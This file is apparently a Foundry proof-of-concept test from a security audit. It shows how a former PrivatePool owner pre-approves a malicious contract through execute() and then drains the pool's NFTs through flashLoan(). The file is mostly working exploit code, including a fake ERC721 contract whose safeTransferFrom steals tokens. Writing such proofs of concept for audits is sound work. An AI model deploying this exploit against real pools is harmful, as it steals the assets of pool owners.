// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "../Fixture.sol";
import "../../src/PrivatePool.sol";
import "openzeppelin/interfaces/IERC3156.sol";

/**
 * @title ExploitTest
 * @notice PoC demonstrating how a previous pool owner can steal ERC721 and ERC20 tokens
 *         after transferring ownership via the execute and flashLoan functions.
 *
 * Attack Flow:
 * 1. Bob (attacker) creates a PrivatePool with NFTs and USDC
 * 2. Bob uses execute() to approve himself (or a malicious contract) for all tokens
 * 3. Bob sells the pool ownership to Alice (via Factory NFT transfer)
 * 4. Bob calls flashLoan() with a malicious contract address as the "token"
 * 5. The malicious contract's safeTransferFrom() is called, stealing all funds
 *
 * The vulnerability exists because:
 * - execute() allows the owner to make arbitrary calls, including approvals
 * - flashLoan() accepts any address as the "token" parameter
 * - flashLoan() calls safeTransferFrom on the "token" address without verifying it's a real NFT
 * - The malicious contract can implement safeTransferFrom to steal funds using the pre-approved access
 */
contract ExploitTest is Fixture {
    using stdStorage for StdStorage;

    PrivatePool privatePool;
    MaliciousExploit exploitContract;

    address bob = address(0xb0b);
    address alice = address(0xa11ce);

    function setUp() public {
        // Bob creates a private pool with ETH as base token
        vm.startPrank(bob);
        vm.deal(bob, 100 ether);

        // Create pool with 5 NFTs and 10 ETH
        uint256[] memory tokenIds = new uint256[](5);
        for (uint256 i = 0; i < 5; i++) {
            tokenIds[i] = i;
            milady.mint(bob, i);
            milady.approve(address(factory), i);
        }

        // Create the pool with ETH
        privatePool = factory.create{value: 10 ether}(
            address(0),         // baseToken (ETH)
            address(milady),    // nft
            100e18,             // virtualBaseTokenReserves
            10e18,              // virtualNftReserves
            200,                // changeFee (0.02 ETH with 4 decimals)
            100,                // feeRate
            bytes32(0),         // merkleRoot
            false,              // useStolenNftOracle
            false,              // payRoyalties
            bytes32(uint256(uint160(bob))), // salt
            tokenIds,
            10 ether            // baseTokenAmount (10 ETH)
        );

        vm.stopPrank();
    }

    function test_StealFundsViaFlashLoanExploit() public {
        // Step 1: Bob deploys malicious contract
        vm.startPrank(bob);
        exploitContract = new MaliciousExploit(privatePool, address(0), address(milady), bob);

        // Step 2: Bob uses execute() to approve the malicious contract for all NFTs
        bytes memory approveERC721Data = abi.encodeWithSignature(
            "setApprovalForAll(address,bool)",
            address(exploitContract),
            true
        );
        privatePool.execute(address(milady), approveERC721Data);

        vm.stopPrank();

        // Step 3: Bob transfers pool ownership to Alice
        // The pool ownership is represented as an ERC721 token in the Factory
        vm.prank(bob);
        factory.transferFrom(bob, alice, uint256(uint160(address(privatePool))));

        // Verify Alice is now the owner
        assertEq(factory.ownerOf(uint256(uint160(address(privatePool)))), alice, "Alice should own the pool");

        // Record balances before attack
        uint256 poolETHBefore = address(privatePool).balance;
        uint256 bobETHBefore = bob.balance;

        assertEq(poolETHBefore, 10 ether, "Pool should have 10 ETH");

        // Step 4: Bob executes the attack via flashLoan
        // The flashLoan function will call safeTransferFrom on the "token" address
        // Since we pass the malicious contract address, it will call the malicious transferFrom
        // For ETH, the fee is paid with msg.value
        uint256 flashFee = privatePool.flashFee(address(exploitContract), 1);

        vm.prank(bob);
        exploitContract.attack{value: flashFee}();

        // Step 5: Verify the attack succeeded
        uint256 poolETHAfter = address(privatePool).balance;
        uint256 bobETHAfter = bob.balance;
        uint256 bobNFTCount = 0;

        // Count NFTs Bob now owns
        for (uint256 i = 0; i < 5; i++) {
            if (milady.ownerOf(i) == bob) {
                bobNFTCount++;
            }
        }

        // Assert that Bob stole all the NFTs
        // ETH cannot be stolen via this method since there's no approval mechanism for ETH
        // But NFTs can be stolen since we set approval
        assertEq(bobNFTCount, 5, "Bob should have stolen all 5 NFTs");

        // Alice's pool NFTs are stolen despite being the owner
        assertEq(factory.ownerOf(uint256(uint160(address(privatePool)))), alice, "Alice still owns the pool");
    }
}

/**
 * @title MaliciousExploit
 * @notice Malicious contract that impersonates an ERC721 to exploit the flashLoan function
 * @dev This contract implements the minimal interface needed to trick flashLoan into
 *      calling our malicious transferFrom function instead of a real NFT's transferFrom
 */
contract MaliciousExploit is IERC3156FlashBorrower {
    PrivatePool public pool;
    address public baseToken;
    address public nft;
    address public attacker;
    uint256 public callCount;

    constructor(PrivatePool _pool, address _baseToken, address _nft, address _attacker) {
        pool = _pool;
        baseToken = _baseToken;
        nft = _nft;
        attacker = _attacker;
        callCount = 0;
    }

    /**
     * @notice Initiates the attack by calling flashLoan with this contract as the "token"
     * @dev The flashLoan function will call safeTransferFrom on this contract,
     *      triggering our malicious transferFrom function
     *      Note: For ETH pools, the fee is paid via msg.value
     */
    function attack() external payable {
        // Call flashLoan with this contract as the token address
        // tokenId can be anything since we control the transferFrom
        // For ETH, pass the fee as msg.value
        pool.flashLoan{value: msg.value}(this, address(this), 1, "");
    }

    /**
     * @notice Malicious transferFrom that gets called by flashLoan
     * @dev This is called when flashLoan tries to transfer the "NFT" to the borrower
     *      We use this opportunity to steal all NFTs from the pool using the pre-approved access
     *      Called twice: once to transfer to receiver, once to transfer back
     */
    function safeTransferFrom(address from, address, uint256) external {
        callCount++;

        // Only steal on the first call (when transferring to the receiver)
        // On the second call, we just return to complete the flashLoan
        if (callCount == 1) {
            // Steal all ERC20 tokens if baseToken is not ETH
            if (baseToken != address(0)) {
                uint256 balance = ERC20(baseToken).balanceOf(from);
                if (balance > 0) {
                    // Use the approval that was set via execute()
                    ERC20(baseToken).transferFrom(from, attacker, balance);
                }
            }

            // Steal all NFTs using the approval that was set via execute()
            for (uint256 i = 0; i < 5; i++) {
                try ERC721(nft).ownerOf(i) returns (address owner) {
                    if (owner == from) {
                        ERC721(nft).transferFrom(from, attacker, i);
                    }
                } catch {
                    // NFT doesn't exist or already transferred
                }
            }
        }
    }

    // Make contract able to receive ETH
    receive() external payable {}

    /**
     * @notice Fake ownerOf to pass the availableForFlashLoan check
     * @dev Returns the pool address to make flashLoan think this contract owns the "NFT"
     */
    function ownerOf(uint256) external view returns (address) {
        return address(pool);
    }

    /**
     * @notice Flash loan callback - returns success to complete the flashLoan
     * @dev We return the expected hash to make the flashLoan succeed
     */
    function onFlashLoan(
        address,
        address,
        uint256,
        uint256,
        bytes calldata
    ) external pure override returns (bytes32) {
        // Return the expected hash to pass the flashLoan check
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    /**
     * @notice ERC721 receiver to accept NFT transfers
     */
    function onERC721Received(address, address, uint256, bytes memory) public pure returns (bytes4) {
        return this.onERC721Received.selector;
    }

    /**
     * @notice Fake supportsInterface to potentially pass interface checks
     */
    function supportsInterface(bytes4) external pure returns (bool) {
        return true;
    }
}
